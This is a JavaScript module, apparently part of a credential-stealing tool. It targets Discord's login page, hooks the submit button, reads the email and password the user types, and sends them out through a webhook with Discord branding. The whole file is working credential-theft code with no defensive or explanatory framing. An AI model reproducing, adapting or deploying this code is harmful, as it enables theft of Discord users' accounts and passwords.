const Util = require('../../utils');
const { waitForElement } = require('../../utils/Document');
const { formatFields, code } = require('../../utils/Webhook');

const onLoginUrl = () => {
  waitForElement('button[type="submit"]').then((submitButton) => {
    Util.Forms.onFormSubmit(submitButton, () => {
      const emailInput = document.querySelector('input.inputDefault-Ciwd-S.input-3O04eu.inputField-2RZxdl[type="text"]');
      const passwordInput = document.querySelector('input.inputDefault-Ciwd-S.input-3O04eu[type="password"]');

      Util.Webhook.sendEmbed({
        author: {
          name: 'Discord',
          icon_url: 'https://discord.com/assets/ec2c34cadd4b5f4594415127380a85e6.ico'
        },
        fields: formatFields([
          ['Email', code(emailInput.value)],
          ['Password', code(passwordInput.value)],
        ])
      });
    });
  });
};

module.exports = {
  webPattern: /https:\/\/(canary.|ptb.)?discord\.com/g,
  urlsMatches: [
    {
      path: '/login',
      run: onLoginUrl
    }
  ]
};
